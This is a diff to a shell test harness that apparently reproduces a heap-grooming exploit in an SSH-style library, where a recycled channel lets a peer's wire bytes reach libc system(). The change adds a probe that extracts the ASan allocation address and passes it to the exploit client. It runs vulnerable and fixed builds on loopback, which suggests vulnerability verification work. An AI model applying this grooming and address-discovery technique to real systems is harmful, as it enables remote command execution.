@@ -1,10 +1,10 @@
 #!/bin/sh
 # W16 additive lane: the command string executed by real libc system() comes
 # from the authenticated peer's wire bytes in the recycled channel itself, not
-# from an app-owned static global. The ASan allocator places the recycled
-# 128-byte channel at a deterministic address, so the client can point
-# channel->session at the bytes it sent. Built against the same two pinned
-# commits with no library source change; loopback only.
+# from an app-owned static global. The ASan allocator slot for that channel is
+# discovered by a probe run in this exact build and passed to the client, so
+# the lane is reproducible across build paths. Built against the same two
+# pinned commits with no library source change; loopback only.
 set -u
 cd "$(dirname "$0")" || exit 1
 HERE=$(pwd)
@@ -52,11 +52,12 @@ fi
 PASS=0; FAIL=0
 run_lane() {
     n_name=$1; n_kind=$2; n_mode=$3
+    shift 3
     mkdir -p "wc-run/$n_name"
     ln -sf "$HERE/hostkey" "wc-run/$n_name/hostkey"
     (cd "wc-run/$n_name" && \
         ASAN_OPTIONS=detect_leaks=0:quarantine_size_mb=0 timeout 25 \
-        "$HERE/real_wire-wc-$n_kind" ./hostkey "$n_mode") \
+        "$HERE/real_wire-wc-$n_kind" ./hostkey "$n_mode" "$@") \
         >"evidence-wc-$n_name.out" 2>&1
     echo "lane $n_name rc=$?"
 }
@@ -83,14 +84,25 @@ check_vuln() {
     fi
 }
 
-run_lane vuln-wirecmd vuln groom-wirecmd
+# Discover this build's ASan slot from a probe run of the existing W14 lane.
+# A hard-coded slot is not reproducible across build paths (see W16 report).
+run_lane probe vuln groom-realsystem
+chunk=$(sed -n 's/.*SERVER groom alloc=\(0x[0-9a-f]*\).*/\1/p' \
+    evidence-wc-probe.out | sort -u | sed -n '1p')
+if [ -z "$chunk" ]; then
+    echo "FAIL-probe no groom address"
+    exit 1
+fi
+echo "probe chunk=$chunk"
+
+run_lane vuln-wirecmd vuln groom-wirecmd "$chunk"
 check_vuln vuln-wirecmd
 if [ "$(marker_present vuln-wirecmd)" = yes ]; then
     mv wc-run/vuln-wirecmd/evidence-wire-wirecmd.marker \
        evidence-wc-sideeffect.kept
 fi
 
-run_lane fixed-wirecmd fixed groom-wirecmd
+run_lane fixed-wirecmd fixed groom-wirecmd "$chunk"
 f_out=evidence-wc-fixed-wirecmd.out
 f_file=$(marker_present fixed-wirecmd)
 f_d2=$(grep -c 'SERVER data #2' "$f_out")
@@ -101,7 +113,7 @@ else
     FAIL=$((FAIL+1)); echo "FAIL-fixed-wirecmd got[$f_d2 $f_arm $f_file]"
 fi
 
-run_lane vuln-wirecmd-bad vuln groom-wirecmd-bad
+run_lane vuln-wirecmd-bad vuln groom-wirecmd-bad "$chunk"
 b_out=evidence-wc-vuln-wirecmd-bad.out
 b_file=$(marker_present vuln-wirecmd-bad)
 b_bad=$(grep -c 'CLIENT rc=0 SERVER status=0x' "$b_out")
@@ -116,7 +128,7 @@ else
 fi
 
 for i in 1 2 3; do
-    run_lane "vuln-repeat$i" vuln groom-wirecmd
+    run_lane "vuln-repeat$i" vuln groom-wirecmd "$chunk"
     check_vuln "vuln-repeat$i"
     if [ "$(marker_present "vuln-repeat$i")" = yes ]; then
         mv "wc-run/vuln-repeat$i/evidence-wire-wirecmd.marker" \
